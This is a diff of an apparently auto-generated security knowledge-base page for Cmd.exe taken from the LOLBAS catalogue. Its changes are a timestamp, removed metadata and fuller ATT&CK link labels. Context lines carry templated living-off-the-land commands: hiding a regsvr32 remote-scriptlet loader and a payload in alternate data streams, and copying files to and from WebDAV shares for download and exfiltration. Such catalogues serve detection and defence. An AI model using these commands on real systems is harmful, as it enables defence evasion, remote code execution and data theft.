@@ -4,7 +4,7 @@ framework: "lolbas"
 generated: "true"
 source_path: "yml/OSBinaries/Cmd.yml"
 source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmd.yml"
-build_date: "2026-04-27 18:39:01"
+build_date: "2026-04-27 19:14:21"
 category: "OSBinaries"
 aliases:
   - "Cmd.exe"
@@ -24,16 +24,7 @@ tags:
 
 [[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]
 
-# Cmd.exe
-
 The command-line interpreter in Windows
-
-## Metadata
-
-- Category: OSBinaries
-- Created: 2019-06-26
-- Author: Ye Yint Min Thu Htut
-- Source Path: yml/OSBinaries/Cmd.yml
 
 ## Paths
 
@@ -53,7 +44,7 @@ cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:p
 - Use Case: Can be used to evade defensive countermeasures or to hide as a persistence mechanism
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1564-hide_artifacts|T1564.004]]
+- ATT&CK: [[kb/attack/techniques/T1564-hide_artifacts#^t1564004-ntfs-file-attributes|T1564.004: NTFS File Attributes]]
 
 ### 2. ADS
 
@@ -66,7 +57,7 @@ cmd.exe - < {PATH}:payload.bat
 - Use Case: Can be used to evade defensive countermeasures or to hide as a persistence mechanism
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1059-command_and_scripting_interpreter|T1059.003]]
+- ATT&CK: [[kb/attack/techniques/T1059-command_and_scripting_interpreter#^t1059003-windows-command-shell|T1059.003: Windows Command Shell]]
 
 ### 3. Download
 
@@ -79,7 +70,7 @@ type {PATH_SMB} > {PATH_ABSOLUTE}
 - Use Case: Download/copy a file from a WebDAV server
 - Privileges: User
 - Operating System: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]
+- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]
 
 ### 4. Upload
 
@@ -92,7 +83,7 @@ type {PATH_ABSOLUTE} > {PATH_SMB}
 - Use Case: Upload a file to a WebDAV server
 - Privileges: User
 - Operating System: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1048-exfiltration_over_alternative_protocol|T1048.003]]
+- ATT&CK: [[kb/attack/techniques/T1048-exfiltration_over_alternative_protocol#^t1048003-exfiltration-over-unencrypted-non-c2-protocol|T1048.003: Exfiltration Over Unencrypted Non-C2 Protocol]]
 
 ## Detections
 
